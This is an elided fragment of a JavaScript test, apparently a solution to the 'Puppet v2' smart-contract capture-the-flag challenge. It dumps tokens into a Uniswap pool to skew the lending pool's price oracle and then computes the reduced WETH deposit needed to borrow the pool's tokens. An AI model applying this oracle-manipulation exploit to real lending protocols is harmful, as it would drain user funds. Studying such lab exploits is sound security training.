...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackuniswap = this.uniswapRouter.connect(attacker);
        ...
        const logBalance = async (address, name) => {
            ...
            console.log(`DVT token balance of ${name} is`, ethers.utils.formatEther(tknBal));
            console.log(" ");
        }

        logBalance(attacker.address, "Attacker");

        await attackToken.approve(attackuniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await attackuniswap.swapExactTokensForTokens(
        ...
        await logBalance(this.uniswapExchange.address, "Uniswap exchange");

        //calculating deposit
        const deposit = await attacklender.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Required deposit for all token is", ethers.utils.formatEther(deposit));
